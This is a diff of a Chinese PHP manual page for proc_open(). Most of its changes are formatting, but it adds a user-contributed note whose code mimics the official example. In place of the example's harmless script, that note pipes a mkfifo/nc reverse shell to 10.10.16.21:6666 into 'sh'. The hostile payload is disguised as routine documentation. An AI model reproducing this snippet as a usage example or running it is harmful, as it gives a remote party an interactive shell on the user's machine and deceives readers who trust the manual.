@@ -3,8 +3,9 @@
  <head>
   <meta http-equiv="content-type" content="text/html; CHARSET=gb2312">
   <title>执行一个命令，并且打开用来输入/输出的文件指针。</title>
-<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-base.css" />
-<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-medium.css" />
+<link media="all" rel="stylesheet" type="text/css" href="styles/46435ff017f60abb4908b0ce55102d08-theme-base.css" />
+<link media="all" rel="stylesheet" type="text/css" href="styles/46435ff017f60abb4908b0ce55102d08-theme-medium.css" />
+
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <link media="all" rel="stylesheet" type="text/css" href="style.css"/>
  </head>
@@ -259,11 +260,11 @@
  <div class="refsect1 examples" id="refsect1-function.proc-open-examples">
   <h3 class="title">范例</h3>
   <p class="para">
-   <div class="example" id="example-3304">
+   <div class="example" id="">
     <p><strong>Example #1 <span class="function"><strong>proc_open()</strong></span> 例程</strong></p>
     <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
-<span style="color: #0000BB">&lt;?php<br />$descriptorspec&nbsp;</span><span style="color: #007700">=&nbsp;array(<br />&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">0&nbsp;</span><span style="color: #007700">=&gt;&nbsp;array(</span><span style="color: #DD0000">"pipe"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"r"</span><span style="color: #007700">),&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;标准输入，子进程从此管道中读取数据<br />&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">1&nbsp;</span><span style="color: #007700">=&gt;&nbsp;array(</span><span style="color: #DD0000">"pipe"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"w"</span><span style="color: #007700">),&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;标准输出，子进程向此管道中写入数据<br />&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">2&nbsp;</span><span style="color: #007700">=&gt;&nbsp;array(</span><span style="color: #DD0000">"file"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"/tmp/error-output.txt"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"a"</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">//&nbsp;标准错误，写入到一个文件<br /></span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$cwd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'/tmp'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$env&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'some_option'&nbsp;</span><span style="color: #007700">=&gt;&nbsp;</span><span style="color: #DD0000">'aeiou'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$process&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">proc_open</span><span style="color: #007700">(</span><span style="color: #DD0000">'php'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$descriptorspec</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$cwd</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$env</span><span style="color: #007700">);<br /><br />if&nbsp;(</span><span style="color: #0000BB">is_resource</span><span style="color: #007700">(</span><span style="color: #0000BB">$process</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;$pipes&nbsp;现在看起来是这样的：<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;0&nbsp;=&gt;&nbsp;可以向子进程标准输入写入的句柄<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;1&nbsp;=&gt;&nbsp;可以从子进程标准输出读取的句柄<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;错误输出将被追加到文件&nbsp;/tmp/error-output.txt<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">fwrite</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">],&nbsp;</span><span style="color: #DD0000">'&lt;?php&nbsp;print_r($_ENV);&nbsp;?&gt;'</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">fclose</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">]);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #0000BB">stream_get_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">fclose</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;切记：在调用&nbsp;proc_close&nbsp;之前关闭所有的管道以避免死锁。<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$return_value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">proc_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$process</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"command&nbsp;returned&nbsp;</span><span style="color: #0000BB">$return_value</span><span style="color: #DD0000">\n"</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
+<span style="color: #0000BB">&lt;?php<br />$descriptorspec </span><span style="color: #007700">= array(<br />   </span><span style="color: #0000BB">0 </span><span style="color: #007700">=&gt; array(</span><span style="color: #DD0000">"pipe"</span><span style="color: #007700">, </span><span style="color: #DD0000">"r"</span><span style="color: #007700">),  </span><span style="color: #FF8000">// 标准输入，子进程从此管道中读取数据<br />   </span><span style="color: #0000BB">1 </span><span style="color: #007700">=&gt; array(</span><span style="color: #DD0000">"pipe"</span><span style="color: #007700">, </span><span style="color: #DD0000">"w"</span><span style="color: #007700">),  </span><span style="color: #FF8000">// 标准输出，子进程向此管道中写入数据<br />   </span><span style="color: #0000BB">2 </span><span style="color: #007700">=&gt; array(</span><span style="color: #DD0000">"file"</span><span style="color: #007700">, </span><span style="color: #DD0000">"/tmp/error-output.txt"</span><span style="color: #007700">, </span><span style="color: #DD0000">"a"</span><span style="color: #007700">) </span><span style="color: #FF8000">// 标准错误，写入到一个文件<br /></span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$cwd </span><span style="color: #007700">= </span><span style="color: #DD0000">'/tmp'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$env </span><span style="color: #007700">= array(</span><span style="color: #DD0000">'some_option' </span><span style="color: #007700">=&gt; </span><span style="color: #DD0000">'aeiou'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$process </span><span style="color: #007700">= </span><span style="color: #0000BB">proc_open</span><span style="color: #007700">(</span><span style="color: #DD0000">'php'</span><span style="color: #007700">, </span><span style="color: #0000BB">$descriptorspec</span><span style="color: #007700">, </span><span style="color: #0000BB">$pipes</span><span style="color: #007700">, </span><span style="color: #0000BB">$cwd</span><span style="color: #007700">, </span><span style="color: #0000BB">$env</span><span style="color: #007700">);<br /><br />if (</span><span style="color: #0000BB">is_resource</span><span style="color: #007700">(</span><span style="color: #0000BB">$process</span><span style="color: #007700">)) {<br />    </span><span style="color: #FF8000">// $pipes 现在看起来是这样的：<br />    // 0 =&gt; 可以向子进程标准输入写入的句柄<br />    // 1 =&gt; 可以从子进程标准输出读取的句柄<br />    // 错误输出将被追加到文件 /tmp/error-output.txt<br /><br />    </span><span style="color: #0000BB">fwrite</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">], </span><span style="color: #DD0000">'&lt;?php print_r($_ENV); ?&gt;'</span><span style="color: #007700">);<br />    </span><span style="color: #0000BB">fclose</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">]);<br /><br />    echo </span><span style="color: #0000BB">stream_get_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]);<br />    </span><span style="color: #0000BB">fclose</span><span style="color: #007700">(</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]);<br />    <br /><br />    </span><span style="color: #FF8000">// 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。<br />    </span><span style="color: #0000BB">$return_value </span><span style="color: #007700">= </span><span style="color: #0000BB">proc_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$process</span><span style="color: #007700">);<br /><br />    echo </span><span style="color: #DD0000">"command returned </span><span style="color: #0000BB">$return_value</span><span style="color: #DD0000">\n"</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
 </span>
 </code></div>
     </div>
@@ -285,7 +286,7 @@ command returned 0
   </p>
 
   <p class="para">
-   <div class="example" id="example-3305">
+   <div class="example" id="">
     <p><strong>Example #2 <span class="function"><strong>proc_open()</strong></span> 在 Windows 上的怪异行为</strong></p>
     <div class="example-contents"><p>
      虽然人们可能期望下面的程序能够搜索文件
@@ -294,7 +295,7 @@ command returned 0
     </p></div>
     <div class="example-contents">
      <div class="phpcode"><code><span style="color: #000000">
-<span style="color: #0000BB">&lt;?php<br />$descriptorspec&nbsp;</span><span style="color: #007700">=&nbsp;[</span><span style="color: #0000BB">STDIN</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">STDOUT</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">STDOUT</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">$cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'"findstr"&nbsp;"search"&nbsp;"filename.txt"'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$proc&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">proc_open</span><span style="color: #007700">(</span><span style="color: #0000BB">$cmd</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$descriptorspec</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$pipes</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">proc_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$proc</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;</span>
+<span style="color: #0000BB">&lt;?php<br />$descriptorspec </span><span style="color: #007700">= [</span><span style="color: #0000BB">STDIN</span><span style="color: #007700">, </span><span style="color: #0000BB">STDOUT</span><span style="color: #007700">, </span><span style="color: #0000BB">STDOUT</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">$cmd </span><span style="color: #007700">= </span><span style="color: #DD0000">'"findstr" "search" "filename.txt"'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$proc </span><span style="color: #007700">= </span><span style="color: #0000BB">proc_open</span><span style="color: #007700">(</span><span style="color: #0000BB">$cmd</span><span style="color: #007700">, </span><span style="color: #0000BB">$descriptorspec</span><span style="color: #007700">, </span><span style="color: #0000BB">$pipes</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">proc_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$proc</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;</span>
 </span>
 </code></div>
     </div>
@@ -311,7 +312,7 @@ operable program or batch file.
     </p></div>
     <div class="example-contents">
      <div class="phpcode"><code><span style="color: #000000">
-$cmd&nbsp;=&nbsp;'""findstr"&nbsp;"search"&nbsp;"filename.txt""';</span>
+$cmd = '""findstr" "search" "filename.txt""';</span>
 </code></div>
     </div>
 
@@ -361,7 +362,36 @@ $cmd&nbsp;=&nbsp;'""findstr"&nbsp;"search"&nbsp;"filename.txt""';</span>
  <div class="head">
   <h3 class="title">User Contributed Notes</h3>
  </div>
-<div id="allnotes">  <a name="120608""></a>
+<div id="allnotes">  <a name="128029""></a>
+  <div class="note">
+   <strong class="user">anony mouse</strong>
+   <a href="#128029" class="date">20-Dec-2022 07:25</a>
+   <div class="text">
+    <div class="phpcode">
+<code><span class="html">
+<span class="default">&lt;?php<br />
+$descriptorspec </span><span class="keyword">= array(<br />
+&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdin is a pipe that the child will read from<br />
+&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdout is a pipe that the child will write to<br />
+&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"file"</span><span class="keyword">, </span><span class="string">"/tmp/error-output.txt"</span><span class="keyword">, </span><span class="string">"a"</span><span class="keyword">) </span><span class="comment">// stderr is a file to write to<br />
+</span><span class="keyword">);<br />
+</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">'sh'</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">, </span><span class="default">$cwd</span><span class="keyword">, </span><span class="default">$env</span><span class="keyword">);<br />
+if (</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) {<br />
+&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.21 6666 &gt;/tmp/f'</span><span class="keyword">);<br />
+&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
+&nbsp;&nbsp;&nbsp; echo </span><span class="default">stream_get_contents</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
+&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
+&nbsp;&nbsp;&nbsp; </span><span class="default">$return_value </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);<br />
+&nbsp;&nbsp;&nbsp; echo </span><span class="string">"command returned </span><span class="default">$return_value</span><span class="string">\n"</span><span class="keyword">;<br />
+}<br />
+</span><span class="default">?&gt;</span>
+</span>
+</code>
+    </div>
+   </div>
+  </div>
+ <div class="foot"></div>
+  <a name="120608""></a>
   <div class="note">
    <strong class="user">weirdall at hotmail dot com</strong>
    <a href="#120608" class="date">07-Feb-2017 03:01</a>
